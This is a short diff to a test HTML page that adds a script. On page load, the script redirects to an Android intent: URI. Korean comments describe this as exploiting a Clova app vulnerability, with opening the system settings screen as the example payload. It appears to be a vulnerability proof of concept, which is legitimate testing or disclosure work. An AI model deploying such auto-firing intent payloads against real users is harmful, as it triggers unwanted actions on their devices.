@@ -3,5 +3,13 @@
 <head><title>Test</title></head>
 <body>
     <h1>Hellllooooo!!!</h1>
+    
+    <script>
+        // 페이지 로드와 동시에 클로바 앱의 취약점을 이용해 인텐트를 쏩니다.
+        window.onload = function() {
+            // 예: 안드로이드 설정창을 강제로 띄우는 페이로드
+            location.href = "intent:#Intent;action=android.settings.SETTINGS;end";
+        };
+    </script>
 </body>
 </html>
